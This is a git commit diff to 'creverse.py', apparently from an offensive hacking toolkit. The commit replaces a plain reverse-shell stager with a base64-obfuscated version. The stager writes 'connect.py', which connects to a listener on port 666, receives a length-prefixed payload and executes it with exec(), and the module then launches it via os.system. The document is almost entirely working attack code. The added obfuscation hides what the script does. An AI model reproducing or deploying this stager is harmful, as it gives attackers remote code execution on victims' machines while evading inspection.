ee0df04d8186e4cf072f3779ee04bf4580fe7d60
ST4LK3RCR4ZY <a_netocosta30@hotmail.com>
2016-12-25 16:21:20 -0300

    Update creverse.py

--- modules/creverse.py
+++ modules/creverse.py
@@ -2,14 +2,9 @@ import socket,struct,os
 
 def ran():
 	l = open("connect.py","w")
-        l.write("import socket,struct\n")
-	l.write("\n")
-	l.write("s=socket.socket(2,socket.SOCK_STREAM)\n")
-	l.write("s.connect(('127.0.0.1',666))\n")
-	l.write("l=struct.unpack('>I',s.recv(4))[0]\n")
-	l.write("d=s.recv(l)\n")
-	l.write("	d+=s.recv(l-len(d))\n")
-	l.write("exec(d,{'s':s})\n")
+        l.write("import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}\n")
+	l.write("[sys.version_info[0]]\n")
+	l.write("('aW1wb3J0IHNvY2tldCxzdHJ1Y3QKcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQpzLmNvbm5lY3QoKCcxMjcuMC4wLjEnLDY2NikpCmw9c3RydWN0LnVucGFjaygnPkknLHMucmVjdig0KSlbMF0KZD1zLnJlY3YobCkKd2hpbGUgbGVuKGQpPGw6CglkKz1zLnJlY3YobC1sZW4oZCkpCmV4ZWMoZCx7J3MnOnN9KQo=')))"
 	l.close()
         print "[ + ] Connection [ + ]"
 	os.system("python connect.py")
